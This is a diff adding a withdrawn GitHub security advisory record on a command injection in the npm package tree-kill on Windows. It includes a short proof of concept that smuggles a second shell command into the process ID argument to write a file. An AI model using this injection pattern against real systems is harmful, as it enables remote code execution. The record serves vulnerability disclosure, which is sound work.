@@ -1,0 +1,70 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-mxq6-vrrr-ppmg",
+  "modified": "2023-11-08T20:03:29Z",
+  "published": "2022-05-24T17:04:00Z",
+  "withdrawn": "2023-11-08T19:16:49Z",
+  "aliases": [
+
+  ],
+  "summary": "Duplicate Advisory: tree-kill vulnerable to remote code execution",
+  "details": "## Duplicate Advisory\nThis advisory has been withdrawn because it is a duplicate of GHSA-884p-74jh-xrg2. Ths link is maintained to preserve external references.\n\n## Original Description\nA Code Injection exists in tree-kill on Windows which allows a remote code execution when an attacker is able to control the input into the command, which is executed without any check. The issue arises here: `https://github.com/pkrumins/node-tree-kill/blob/master/index.js#L20` . While the Linux part is sanitized, the Windows on simply uses the `+` operand to concatenate the input into `exec()`\n\n### Steps To Reproduce:\n\nCreate the following PoC file:\n\n```js\n// poc.js\nvar kill = require('tree-kill');\nkill('3333332 & echo \"HACKED\" > HACKED.txt & ');\n```\nExecute the following commands in another terminal:\n\n```bash\nnpm i tree-kill # Install affected module\ndir # Check *HACKED.txt* doesn't exist\nnode poc.js #  Run the PoC\ndir # Now *HACKED.txt* exists :)\n```\n\nA new file called `HACKED.txt` will be created, containing the `HACKED` string.",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "tree-kill"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "last_affected": "1.2.1"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2019-15599"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/pkrumins/node-tree-kill/commit/deee138a8cbc918463d8af5ce8c2bec33c3fd164"
+    },
+    {
+      "type": "WEB",
+      "url": "https://hackerone.com/reports/701183"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/pkrumins/node-tree-kill"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/pkrumins/node-tree-kill/releases/tag/v1.2.2"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-94"
+    ],
+    "severity": "CRITICAL",
+    "github_reviewed": true,
+    "github_reviewed_at": "2023-10-19T18:39:48Z",
+    "nvd_published_at": "2019-12-18T21:15:00Z"
+  }
+}
